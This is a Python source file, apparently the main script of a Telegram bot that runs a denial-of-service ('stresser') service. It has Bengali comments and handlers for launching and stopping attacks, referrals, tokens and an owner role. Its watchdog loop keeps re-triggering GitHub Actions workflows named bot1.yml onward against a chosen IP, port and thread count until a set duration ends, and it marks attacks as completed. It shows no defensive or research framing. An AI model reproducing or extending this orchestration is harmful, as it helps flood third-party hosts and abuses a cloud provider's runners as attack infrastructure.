# main.py
from pyrogram import Client
import logging
import asyncio
import threading
import time
from config import (API_ID, API_HASH, BOT_TOKEN, OWNER_ID, PORT, WORKFLOW_COUNT)
import state

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Client(
    "tester_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    workers=50
)

# ===== REGISTER HANDLERS =====
from handlers import start, launch, status, stop, history
from handlers import referral, profile, users, settings
from handlers import statistics, logs, owner, token, callbacks

start.register(app)
launch.register(app)
status.register(app)
stop.register(app)
history.register(app)
referral.register(app)
profile.register(app)
users.register(app)
settings.register(app)
statistics.register(app)
logs.register(app)
owner.register(app)
token.register(app)
callbacks.register(app)

# ===== WATCHDOG LOOP =====
async def watchdog_loop():
    from services.github import get_all_runs, trigger_workflow
    from database import load, save
    from datetime import datetime
    logger.info("🐕 Watchdog started")

    while True:
        try:
            if state.watchdog_enabled and state.current_target["ip"]:

                # ===== DURATION CHECK =====
                # Attack শুরুর সময় থেকে duration পার হলে watchdog বন্ধ করো
                started_at = state.current_target.get("started_at", 0)
                duration   = state.current_target.get("duration", 0)

                if started_at and duration:
                    elapsed = time.time() - started_at
                    if elapsed >= duration:
                        logger.info(f"⏰ Duration {duration}s completed. Stopping watchdog.")
                        state.watchdog_enabled = False
                        state.current_target = {
                            "ip": None, "port": None,
                            "threads": 1000, "duration": 0, "started_at": 0
                        }
                        # DB তে attack status update করো
                        attacks = load("attacks")
                        for aid, a in attacks.items():
                            if a.get("status") == "running":
                                a["status"] = "completed"
                                a["stopped_at"] = datetime.now().isoformat()
                        save("attacks", attacks)
                        logger.info("✅ Attack marked as completed")
                        await asyncio.sleep(60)
                        continue

                # ===== RUNNING CHECK =====
                wf_status = get_all_runs()
                running_count = sum(
                    1 for wf, s in wf_status.items()
                    if wf.startswith("bot") and s in ["in_progress", "queued"]
                )

                remaining = 0
                if started_at and duration:
                    elapsed   = time.time() - started_at
                    remaining = max(0, int(duration - elapsed))

                if running_count < WORKFLOW_COUNT and remaining > 60:
                    # Duration এ কমপক্ষে ৬০ সেকেন্ড বাকি থাকলেই restart
                    logger.info(f"⚠️ {running_count}/{WORKFLOW_COUNT} running, {remaining}s remaining — restarting...")
                    for i in range(1, WORKFLOW_COUNT + 1):
                        wf = f"bot{i}.yml"
                        if wf_status.get(wf) not in ["in_progress", "queued"]:
                            trigger_workflow(
                                wf,
                                state.current_target["ip"],
                                state.current_target["port"],
                                state.current_target["threads"],
                                remaining  # বাকি সময়টুকুই duration হিসেবে দাও
                            )
                            await asyncio.sleep(1)
                elif running_count >= WORKFLOW_COUNT:
                    logger.info(f"✅ {running_count}/{WORKFLOW_COUNT} running | {remaining}s remaining")
                else:
                    logger.info(f"⏰ <60s remaining, not restarting")

        except Exception as e:
            logger.error(f"Watchdog error: {e}")

        await asyncio.sleep(60)

def start_watchdog():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(watchdog_loop())

# ===== FLASK =====
from flask import Flask
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    started_at = state.current_target.get("started_at", 0)
    duration   = state.current_target.get("duration", 0)
    elapsed    = int(time.time() - started_at) if started_at else 0
    remaining  = max(0, duration - elapsed) if duration else 0
    return {
        "status": "alive",
        "watchdog": state.watchdog_enabled,
        "target": f"{state.current_target['ip']}:{state.current_target['port']}"
                  if state.current_target["ip"] else None,
        "elapsed": elapsed,
        "remaining": remaining
    }, 200

@flask_app.route('/health')
def health_check():
    return {"status": "ok"}, 200

def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT)

# ===== MAIN =====
if __name__ == "__main__":
    logger.info("🚀 Bot starting...")
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=start_watchdog, daemon=True).start()
    logger.info(f"👑 Owner: {OWNER_ID}")
    logger.info(f"⚙️ Workflows: {WORKFLOW_COUNT}")
    app.run()
